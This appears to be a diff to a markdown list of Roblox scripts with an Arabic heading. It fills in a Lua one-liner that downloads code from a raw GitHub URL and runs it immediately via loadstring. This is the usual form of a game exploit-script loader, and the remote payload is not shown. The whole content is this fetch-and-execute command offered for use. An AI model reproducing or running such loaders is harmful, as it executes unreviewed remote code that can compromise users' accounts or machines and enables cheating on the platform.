@@ -1,9 +1,9 @@
 # الـفـضـايـح
 
-# 1
+# 1 ايـات
 
 ```lua
-loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MS7top/Yusef/refs/heads/main/i2att.txt"))()
 ```
 
 # 2
